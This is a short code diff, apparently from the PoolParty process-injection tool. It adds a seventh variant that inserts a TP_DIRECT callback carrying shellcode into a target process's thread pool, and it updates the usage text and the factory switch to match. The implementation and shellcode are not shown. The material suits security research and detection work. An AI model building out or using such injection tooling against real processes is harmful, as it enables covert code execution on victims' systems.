@@ -33,6 +33,7 @@ void PrintUsage()
 		"#4: (RemoteIoCompletionCallbackInsertion) " << std::endl << "\t+ Insert IO completion (TP_IO) to the target process's thread pool" << std::endl << std::endl <<
 		"#5: (RemoteAlpcCallbackInsertion) " << std::endl << "\t+ Insert ALPC (TP_ALPC) to the target process's thread pool" << std::endl << std::endl <<
 		"#6: (RemoteJobCallbackInsertion) " << std::endl << "\t+ Insert job (TP_JOB) to the target process's thread pool" << std::endl << std::endl << std::endl <<
+		"#7: (RemoteDirectCallbackInsertion) " << std::endl << "\t+ Insert direct (TP_DIRECT) to the target process's thread pool" << std::endl << std::endl << std::endl <<
 		"EXAMPLES:" << std::endl <<
 		"------" << std::endl << std::endl <<
 		"#1 RemoteWorkItemInsertion against pid <1234> " << std::endl << "\t>>PoolParty.exe 1 1234" << std::endl << std::endl <<
@@ -90,6 +91,8 @@ std::unique_ptr<PoolParty> PoolPartyFactory(int VariantId, int TargetPid)
 		return std::make_unique<RemoteAlpcCallbackInsertion>(TargetPid, g_Shellcode);
 	case 6:
 		return std::make_unique<RemoteJobCallbackInsertion>(TargetPid, g_Shellcode);
+	case 7:
+		return std::make_unique<RemoteDirectCallbackInsertion>(TargetPid, g_Shellcode);
 	default:
 		throw std::runtime_error("Invalid variant ID");
 	}
